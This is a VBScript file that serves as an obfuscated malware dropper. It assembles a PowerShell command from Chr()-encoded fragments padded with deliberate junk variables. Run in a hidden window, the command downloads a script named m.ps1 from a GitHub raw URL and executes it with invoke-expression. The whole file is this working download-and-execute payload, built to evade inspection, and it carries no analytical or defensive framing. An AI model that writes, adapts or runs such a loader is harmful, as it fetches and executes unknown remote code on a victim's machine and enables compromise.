Option Explicit

Dim shellObject, obfuscatedCommand, cmdPart1, cmdPart2, cmdPart3, cmdPart4
Dim junkVar1, junkVar2, junkVar3, junkVar4, junkVar5, junkVar6

Set shellObject = CreateObject("WScript.Shell")

' Add junk code that doesn't affect the script's function
junkVar1 = "This is just junk code to confuse"
junkVar2 = 123456
junkVar3 = "No-op statement"
junkVar4 = junkVar2 + 42
junkVar5 = "Not used but adds confusion"
junkVar6 = junkVar4 * 5 ' Unused junk operation
If junkVar2 = junkVar2 Then
    junkVar3 = junkVar3 & junkVar5
End If

' Break down the command into smaller parts and obfuscate each part
cmdPart1 = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & ".exe -c """ 
cmdPart2 = Chr(36) & "script = iwr " & Chr(104) & Chr(116) & Chr(116) & Chr(112) & "://"
cmdPart3 = "raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/m.ps1; "
cmdPart4 = "invoke-expression $script"""

' Combine all parts
obfuscatedCommand = cmdPart1 & cmdPart2 & cmdPart3 & cmdPart4

' More junk code to obfuscate
junkVar1 = junkVar1 & " appended"
If junkVar3 = junkVar1 Then
    junkVar4 = junkVar4 + 99999
End If

' Even more unused junk code
If junkVar6 > junkVar2 Then
    junkVar5 = junkVar5 & " and more junk"
End If

' Run the obfuscated PowerShell command
shellObject.Run obfuscatedCommand, 0, True

Set shellObject = Nothing
